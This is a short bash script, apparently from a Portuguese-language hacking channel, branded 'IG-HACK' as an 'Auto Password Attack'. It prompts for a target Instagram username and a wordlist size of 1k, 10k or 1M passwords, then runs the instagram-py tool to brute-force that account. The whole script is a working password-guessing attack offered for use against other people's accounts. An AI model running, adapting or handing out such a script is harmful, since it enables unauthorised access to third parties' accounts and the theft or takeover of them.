#wordlist selection.
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
      ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
      ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
      ██║██║  ███╗█████╗███████║███████║██║V1.1 █████╔╝
      ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
      ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
      ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                [#] Auto Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By gilmar filho << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  meu canal no Youtube : \e[1;96m Força Bruta \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
echo -e "$grn              [+]$red Type$ylo 1$blue PARA 1k senhas$grn
              [+]$red Type$ylo 2$red PARA 10K senhas$grn
              [+]$red Type$ylo 3$red PARA 1M senha$rset"
echo
read -p "[#] Enter Selected Number: " marks
echo 
if [ $marks = 1 ]
then
    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass1.txt 
 
elif [ $marks = 2 ]
then
    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass2.txt
 
elif [ $marks = 3 ]
then
    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass3.txt
else
echo
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
echo
sleep 1.0
cd $HOME
fi
sleep 10.0
cd $HOME/ighackinstagram
bash ighack.sh
